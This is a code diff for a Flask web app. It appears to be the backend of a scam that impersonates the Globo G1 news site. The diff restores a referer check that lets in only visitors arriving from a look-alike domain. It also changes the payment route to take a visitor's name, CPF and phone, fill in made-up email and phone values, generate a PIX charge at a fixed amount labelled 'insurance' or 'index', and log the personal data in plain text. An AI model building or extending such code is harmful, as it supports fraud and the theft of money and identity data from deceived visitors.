@@ -23,21 +23,9 @@ AUTHORIZED_DOMAIN = "g1globo.noticiario-plantao.com"
 def check_referer(f):
     @functools.wraps(f)
     def decorated_function(*args, **kwargs):
-        # Verificar se é a rota /obrigado - se for, permitir acesso sem verificar referer
-        if request.path == '/obrigado':
-            app.logger.info(f"Página de agradecimento acessada. Permitindo acesso sem verificação de referer.")
-            return f(*args, **kwargs)
-            
         # Obter referer
         referer = request.headers.get('Referer')
         
-        # Durante o desenvolvimento, sempre permitir acesso
-        # Para facilitar os testes no ambiente Replit
-        app.logger.info(f"Ambiente de desenvolvimento detectado. Permitindo acesso. Referer: {referer}, Path: {request.path}")
-        return f(*args, **kwargs)
-        
-        # Código abaixo está temporariamente desabilitado para testes
-        """
         # Verificar se estamos forçando a verificação de domínio
         FORCE_DOMAIN_CHECK = os.environ.get('FORCE_DOMAIN_CHECK', 'False').lower() == 'true'
         
@@ -59,7 +47,6 @@ def check_referer(f):
         # Se chegou aqui, o referer contém o domínio autorizado
         app.logger.info(f"Acesso autorizado via domínio para: {request.path}")
         return f(*args, **kwargs)
-        """
         
     return decorated_function
 
@@ -501,14 +488,13 @@ def index():
 @check_referer
 def payment():
     try:
-        app.logger.info("[PROD] Renderizando página de pagamento...")
+        app.logger.info("[PROD] Iniciando geração de PIX...")
 
         # Obter dados do usuário da query string
         nome = request.args.get('nome')
         cpf = request.args.get('cpf')
         phone = request.args.get('phone')  # Get phone from query params
         source = request.args.get('source', 'index')
-        amount = request.args.get('amount')
 
         if not nome or not cpf:
             app.logger.error("[PROD] Nome ou CPF não fornecidos")
@@ -516,26 +502,77 @@ def payment():
 
         app.logger.info(f"[PROD] Dados do cliente: nome={nome}, cpf={cpf}, phone={phone}, source={source}")
 
-        # Define o valor baseado na origem ou use o valor da URL se disponível
-        if amount:
-            amount = float(amount)
-        elif source == 'insurance':
+        # Inicializa a API de pagamento usando nossa factory
+        api = get_payment_gateway()
+
+        # Formata o CPF removendo pontos e traços
+        cpf_formatted = ''.join(filter(str.isdigit, cpf))
+
+        # Gera um email aleatório baseado no nome do cliente
+        customer_email = generate_random_email(nome)
+
+        # Use provided phone if available, otherwise generate random
+        customer_phone = phone.replace('\D', '') if phone else generate_random_phone()
+
+        # Define o valor baseado na origem
+        if source == 'insurance':
             amount = 47.60  # Valor fixo para o seguro
         elif source == 'index':
             amount = 142.83
         else:
             amount = 74.90
 
-        # Não gerar o PIX automaticamente, apenas renderize o template
-        # O código PIX será gerado quando o usuário clicar no botão no modal
+        # Dados para a transação
+        payment_data = {
+            'name': nome,
+            'email': customer_email,
+            'cpf': cpf_formatted,
+            'phone': customer_phone,
+            'amount': amount
+        }
+
+        app.logger.info(f"[PROD] Dados do pagamento: {payment_data}")
+
+        # Cria o pagamento PIX
+        pix_data = api.create_pix_payment(payment_data)
+
+        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")
+
+        # Send SMS notification if we have a valid phone number
+        if phone:
+            send_sms(phone, nome, amount)
+
+        # Obter QR code e PIX code da resposta da API
+        qr_code = pix_data.get('pixQrCode') or pix_data.get('pix_qr_code')
+        pix_code = pix_data.get('pixCode') or pix_data.get('pix_code')
+        
+        # Garantir que temos valores válidos
+        if not qr_code:
+            # Gerar QR code com biblioteca qrcode
+            qr = qrcode.QRCode(version=1, box_size=10, border=5)
+            qr.add_data(pix_code)
+            qr.make(fit=True)
+            img = qr.make_image(fill_color="black", back_color="white")
+            buffered = BytesIO()
+            img.save(buffered, format="PNG")
+            qr_code = "data:image/png;base64," + base64.b64encode(buffered.getvalue()).decode()
+            
+        if not pix_code:
+            # Algumas APIs podem usar outros nomes para o código PIX
+            pix_code = pix_data.get('copy_paste') or pix_data.get('code') or ''
+        
+        # Log detalhado para depuração
+        app.logger.info(f"[PROD] QR code: {qr_code[:50]}... (truncado)")
+        app.logger.info(f"[PROD] PIX code: {pix_code[:50]}... (truncado)")
+            
         return render_template('payment.html', 
-                        qr_code="",  # Inicialize vazio, será preenchido via JavaScript
-                        pix_code="",  # Inicialize vazio, será preenchido via JavaScript 
-                        nome=nome, 
-                        cpf=format_cpf(cpf),
-                        phone=phone,  # Adicionando o telefone para o template
-                        transaction_id="",  # Inicialize vazio, será preenchido via JavaScript
-                        amount=amount)
+                         qr_code=qr_code,
+                         pix_code=pix_code, 
+                         nome=nome, 
+                         cpf=format_cpf(cpf),
+                         phone=phone,  # Adicionando o telefone para o template
+                         transaction_id=pix_data.get('id'),
+                         amount=amount)
 
     except Exception as e:
         app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
@@ -879,17 +916,6 @@ def create_pix_payment():
             if field not in data or not data[field]:
                 app.logger.error(f"[PROD] Campo obrigatório ausente: {field}")
                 return jsonify({'error': f'Campo obrigatório ausente: {field}'}), 400
-        
-        # Garantir que temos um email (gerar um se não tiver)
-        if 'email' not in data or not data['email']:
-            # Gerar um email baseado no nome
-            nome_sem_acento = re.sub(r'[^a-zA-Z0-9]', '', data['name'].lower())
-            email = f"{nome_sem_acento}{random.randint(100, 999)}@email.com"
-            data['email'] = email
-            
-        # Verificar e registrar o número de telefone (deve ser usado nos pagamentos)
-        phone = data.get('phone', '')
-        app.logger.info(f"[PROD] Número de telefone do cliente: {phone}")
         
         app.logger.info(f"[PROD] Iniciando criação de pagamento PIX: {data}")
         
